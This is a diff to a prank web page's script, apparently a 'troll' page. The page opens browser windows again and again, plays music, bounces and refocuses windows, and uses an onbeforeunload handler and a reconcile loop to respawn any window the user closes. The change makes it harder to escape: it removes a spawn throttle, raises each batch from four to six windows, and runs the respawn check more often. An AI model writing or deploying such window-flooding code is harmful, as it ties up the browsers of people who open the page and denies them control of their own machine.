@@ -169,7 +169,7 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
     try {
       var now = Date.now();
       var lock = localStorage.getItem('tlock');
-      if (lock && now - parseInt(lock, 10) < 2000) return;
+      if (lock && now - parseInt(lock, 10) < 1500) return;
       var alive = 0;
       for (var i = 0; i < localStorage.length; i++) {
         var k = localStorage.key(i);
@@ -184,38 +184,14 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
           }
         }
       }
-      var pStr = localStorage.getItem('tpending');
-      if (pStr) {
-        var pp = pStr.split(':');
-        var pc = parseInt(pp[0], 10);
-        var pt = parseInt(pp[1], 10);
-        if (!isNaN(pc) && pc > 0) {
-          if (!isNaN(pt) && now - pt < 5000) return;
-        }
-      }
       var want = parseInt(localStorage.getItem('twant'), 10);
       if (isNaN(want)) want = TARGET;
       var deficit = want - alive;
       if (deficit > 0) {
         localStorage.setItem('tlock', now);
-        var spawnCount = Math.min(deficit, 4);
-        localStorage.setItem('tpending', spawnCount + ':' + now);
+        var spawnCount = Math.min(deficit, 6);
         for (var j = 0; j < spawnCount; j++) {
           (function(n){ setTimeout(function(){ spawn(); }, n * 200); })(j);
-        }
-      }
-    } catch(e) {}
-  }
-
-  function registerArrival(){
-    try {
-      var pStr = localStorage.getItem('tpending');
-      if (pStr) {
-        var pp = pStr.split(':');
-        var pc = parseInt(pp[0], 10);
-        var pt = parseInt(pp[1], 10);
-        if (!isNaN(pc) && pc > 0 && !isNaN(pt) && Date.now() - pt < 5000) {
-          localStorage.setItem('tpending', (pc - 1) + ':' + pt);
         }
       }
     } catch(e) {}
@@ -230,7 +206,6 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
     startMusic();
     bounceWindow();
     try { localStorage.setItem('troll_' + wid, Date.now()); } catch(e) {}
-    registerArrival();
     window.onbeforeunload = function(){
       try {
         var w = parseInt(localStorage.getItem('twant'), 10);
@@ -247,7 +222,7 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
       }
     });
     setInterval(heartbeat, 500);
-    setInterval(reconcile, 1000);
+    setInterval(reconcile, 600);
     setInterval(function(){
       try {
         if (Math.random() < 0.3) window.focus();
@@ -312,7 +287,6 @@ html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;background:#
     enterAttack();
     try {
       localStorage.setItem('twant', TARGET);
-      localStorage.removeItem('tpending');
     } catch(e) {}
     for (var i = 0; i < TARGET; i++) {
       (function(n){ setTimeout(function(){ spawn(); }, n * 300); })(i);
